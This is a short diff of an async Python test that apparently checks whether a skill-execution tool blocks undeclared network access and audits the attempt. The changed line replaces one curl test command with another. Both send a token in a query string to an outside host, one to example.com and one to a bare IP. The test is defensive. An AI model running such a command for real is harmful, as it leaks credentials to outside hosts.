@@ -147,7 +147,7 @@ async def test_execute_in_skill_blocks_undeclared_network_and_audits(
     result = await tool.ainvoke(
         {
             "skill_directory": "/runtime/thread-network/skills/networked/",
-            "command": "curl https://example.com/private?token=raw",
+            "command": "curl https://8.8.8.8/private?token=raw",
         }
     )
 
